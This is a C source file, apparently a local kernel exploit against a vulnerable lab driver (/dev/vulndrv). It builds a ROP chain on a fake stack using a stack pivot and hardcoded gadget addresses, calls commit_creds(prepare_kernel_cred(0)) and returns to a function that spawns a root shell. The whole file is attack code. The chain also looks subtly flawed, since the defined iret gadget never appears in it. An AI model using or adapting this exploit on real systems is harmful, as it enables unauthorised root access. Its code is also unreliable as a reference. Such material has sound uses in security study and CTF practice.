
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>      
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>

#define DEVICE_PATH "/dev/vulndrv"

struct drv_req {
    unsigned long offset;
};
unsigned long user_cs,user_ss,user_eflags,user_sp;
void save_stats() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}

void get_shell(){
    system("/bin/sh");
}
int main(){
    //stack pivot gadget
    unsigned long xchg_esp_eax = 0xffffffff810d7f38UL; //xchg eax, esp ; ret 0x14ff
    //gadgets:
    unsigned long prepare_kernel_cred = 0xffffffff81092850UL;
    unsigned long commit_cred = 0xffffffff81092550UL;
    unsigned long pop_rdi = 0xffffffff8119e39dUL;     //pop rdi ; ret
    unsigned long pop_rdx = 0xffffffff81122a0dUL;     //pop rdx ; ret
    unsigned long mov_rdi_rax_call_rdx = 0xffffffff810363c1UL;  ////mov rdi, rax ; call rdx
    unsigned long swapgs_pop_ebp = 0xffffffff81051744UL;        //swapgs ; pop rbp ; ret
    unsigned long iret = 0xffffffff8168e3f4UL;          //iretd ; int 0x81
    //new stack addr from xchg esp,eax
    //eax from req.offset
    unsigned long stack_addr = 0x810d7f38UL;
    //rop gadget in new stack addr
    unsigned long mmap_addr = stack_addr & 0xffff0000;
    unsigned long *fake_stack;
    void *mmapd_addr;
    struct drv_req req;
    int fd;
    req.offset = 2305843009148791679;
    save_stats();
    //mmap addr:
    mmapd_addr = mmap((void *)mmap_addr,0x1000000,7,0x32,0,0);
    fprintf(stdout,"stack_addr:0x%lx\n",stack_addr);
    fprintf(stdout,"mmapd_addr:0x%lx\n",(unsigned long)mmapd_addr);
    fake_stack = (unsigned long*)stack_addr;
    fprintf(stdout,"fake_stack_addr:0x%lx\n",fake_stack);
    *fake_stack = pop_rdi;
    //switch rsp
    fake_stack = (unsigned long*)(stack_addr - 0x62a1);
    fprintf(stdout,"fake_stack_addr:0x%lx\n",fake_stack);
    *fake_stack++ = 0UL;
    *fake_stack++ = prepare_kernel_cred;
    *fake_stack++ = pop_rdx;
    *fake_stack++ = pop_rdx;
    *fake_stack++ = mov_rdi_rax_call_rdx;
    *fake_stack++ = commit_cred;
    *fake_stack++ = swapgs_pop_ebp;
    *fake_stack++ = 0xdeadbeafUL;
    *fake_stack++ = (unsigned long)get_shell;
    *fake_stack++ = user_cs;
    *fake_stack++ = user_eflags;
    *fake_stack++ = user_sp;
    *fake_stack++ = user_ss;

    
    fd = open(DEVICE_PATH,O_RDONLY);
    ioctl(fd,0,&req);

}